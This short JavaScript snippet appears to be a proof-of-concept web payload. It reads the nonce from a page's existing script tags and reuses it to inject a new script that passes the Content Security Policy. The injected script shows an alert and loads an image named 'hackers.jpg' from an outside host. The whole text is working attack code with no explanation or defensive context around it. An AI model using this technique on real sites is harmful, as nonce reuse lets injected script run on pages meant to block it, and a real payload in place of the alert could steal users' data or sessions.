var nonce = '';
var scripts = document.scripts;
for (var i = 0; i < scripts.length; i++) {
    var scriptNonce = scripts[i].getAttribute('nonce');
    if (typeof scriptNonce !== 'undefined' && scriptNonce !== null) {
        nonce = scriptNonce;
        console.log("Nonce accessed: " + nonce);
        break;
    }
}
var node = document.createElement('script');
node.setAttribute('nonce', nonce);
node.innerText = "alert('Script added.');var i = document.createElement('img');i.setAttribute('src', 'https://mfyu.co.uk/files/2016-11/hackers.jpg');document.body.appendChild(i);";
document.body.appendChild(node);
